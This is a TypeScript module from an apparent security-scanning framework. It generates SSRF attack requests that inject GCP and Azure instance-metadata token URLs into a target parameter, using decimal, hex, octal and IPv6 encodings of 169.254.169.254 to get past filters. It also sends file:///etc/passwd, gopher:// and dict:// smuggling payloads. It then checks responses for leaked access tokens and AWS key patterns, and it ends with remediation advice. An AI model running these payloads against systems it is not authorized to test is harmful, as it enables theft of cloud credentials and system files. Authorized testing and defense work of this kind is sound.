/**
 * ssrfMultiCloud — SSRF to multi-cloud metadata + protocol smuggling.
 *
 * Extends SSRF coverage beyond AWS IMDS to GCP (Metadata-Flavor:Google) and
 * Azure (Metadata:true) instance metadata, plus protocol-smuggling sinks
 * (gopher://, file://, dict://) and IP-encoding bypasses (decimal/hex/octal/
 * IPv6). Cloud-metadata signatures are DATA, not a detection vocabulary.
 *
 * Confirmed only when a 200 response carries a cloud/metadata signature AND the
 * claim is backed by a recorded evidence item (EvidenceGate). Critical when
 * credential material appears.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

const METADATA_SIGNATURES = [
  '169.254.169.254', 'metadata.google.internal', 'metadata/computeMetadata',
  'Metadata-Flavor', 'instance/profile', 'access_token', 'project-id',
  'iam/security-credentials', 'imds', 'ami-id', 'InstanceMetadata',
]
const CRED_SIGNATURES = ['access_token', 'security-credentials', 'AKIA', 'project-id', 'service_account']

function hasSignature(body: string): boolean {
  if (!body) return false
  const lower = body.toLowerCase()
  return METADATA_SIGNATURES.some((s) => lower.includes(s.toLowerCase())) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
}
function hasCredSignature(body: string): boolean {
  if (!body) return false
  const lower = body.toLowerCase()
  return CRED_SIGNATURES.some((s) => lower.includes(s.toLowerCase())) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
}

// IP-encoding bypasses (data, not logic) — decimal/hex/octal/IPv6 render of 169.254.169.254.
const IP_ENCODINGS = ['169.254.169.254', '0251.0376.0251.0376', '0xA9.0xFE.0xA9.0xFE', '2852039166', '[::ffff:169.254.169.254]']
const PROTO_SCHEMES = ['file:///etc/passwd', 'gopher://169.254.169.254:80/', 'dict://169.254.169.254:11211/']

function injectParam(base: string, param: string, payload: string, method: string): { url: string; body?: string } {
  if (method !== 'GET') return { url: base, body: JSON.stringify({ [param]: payload }) }
  try { const u = new URL(base); u.searchParams.set(param, payload); return { url: u.toString() } } catch { return { url: `${base}${base.includes('?') ? '&' : '?'}${encodeURIComponent(param)}=${encodeURIComponent(payload)}` } }
}

export const ssrfMultiCloud: TechniquePrimitive = {
  id: 'ssrfMultiCloud',
  name: 'SSRF Multi-Cloud + Protocol Smuggling',
  description: 'SSRF pivoting to GCP/Azure metadata and protocol-smuggling sinks (gopher/file/dict) with IP-encoding bypasses.',
  technique: 'ssrf',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    return true
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const base = ctx.endpoint?.url ?? ctx.target!
    const param = ctx.param ?? 'url'
    const method = (ctx.endpoint?.method ?? 'GET').toUpperCase()
    const headers = { ...(ctx.sessionHeaders ?? {}) }
    const steps: AttackStep[] = []

    // GCP metadata (needs Metadata-Flavor header).
    for (const ip of IP_ENCODINGS) {
      const gcp = injectParam(base, param, `http://${ip}/computeMetadata/v1/instance/service-accounts/default/token`, method)
      steps.push({
        id: `ssrf-gcp-${ip.replace(/[^a-z0-9]/gi, '')}`,
        description: `GCP metadata token into ${param} (${ip})`,
        request: { method, url: gcp.url, headers: { ...headers, 'Metadata-Flavor': 'Google' }, ...(gcp.body ? { body: gcp.body } : {}) },
        expectedSignal: 'GCP access_token / project-id leaked',
        metadata: { kind: 'ssrf-gcp', param, payload: ip },
      })
    }
    // Azure metadata (needs Metadata:true header).
    for (const ip of IP_ENCODINGS.slice(0, 2)) {
      const az = injectParam(base, param, `http://${ip}/metadata/instance?api-version=2021-02-01`, method)
      steps.push({
        id: `ssrf-azure-${ip.replace(/[^a-z0-9]/gi, '')}`,
        description: `Azure metadata into ${param} (${ip})`,
        request: { method, url: az.url, headers: { ...headers, 'Metadata': 'true' }, ...(az.body ? { body: az.body } : {}) },
        expectedSignal: 'Azure instance metadata leaked',
        metadata: { kind: 'ssrf-azure', param, payload: ip },
      })
    }
    // Protocol smuggling.
    for (const scheme of PROTO_SCHEMES) {
      const p = injectParam(base, param, scheme, method)
      steps.push({
        id: `ssrf-proto-${scheme.split('://')[0]}`,
        description: `Protocol smuggling ${scheme} into ${param}`,
        request: { method, url: p.url, headers, ...(p.body ? { body: p.body } : {}) },
        expectedSignal: 'file/gopher/dict payload reflected',
        metadata: { kind: 'ssrf-proto', param, payload: scheme },
      })
    }
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    let repStep: StepExecutionResult | undefined
    let credsExposed = false
    for (const r of results) {
      if (!((r.status ?? 0) >= 200 && (r.status ?? 0) < 300)) continue
      const body = r.body ?? ''
      if (hasSignature(body)) {
        const hasCreds = hasCredSignature(body)
        if (!repStep || hasCreds) { repStep = r; if (hasCreds) credsExposed = true }
      }
    }
    if (!repStep) {
      return { confirmed: false, confidence: 0, evidence: [], note: 'no 200 response carried a cloud/metadata signature' }
    }
    const rep = repStep as StepExecutionResult
    const { verified } = evidenceGate.verifyClaim(claimFor('ssrf-multicloud', rep.step.request.url, rep.status!, rep.step.request.method))
    const confirmed = verified
    const evidence = results.filter((r) => (r.status ?? 0) >= 200 && (r.status ?? 0) < 300).map((r) => ({ kind: 'response' as const, label: `${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1500), ref: r.step.id }))
    return {
      confirmed,
      confidence: confirmed ? (credsExposed ? 0.95 : 0.85) : 0.1,
      evidence,
      severity: confirmed ? (credsExposed ? 'critical' : 'high') : undefined,
      finding: confirmed ? { category: 'ssrf', description: `SSRF to multi-cloud metadata${credsExposed ? ' exfiltrated credential material' : ''} via "${rep.step.metadata?.param ?? 'url'}" on ${rep.step.request.url}.`, cwe: 'CWE-918', remediation: 'Allowlist outbound destinations; block link-local and IMDS ranges; enforce IMDSv2 hop-limit=1; validate URLs; disable unused URI schemes.' } : undefined,
      note: `credsExposed=${credsExposed} verified=${verified}`,
    }
  },
}
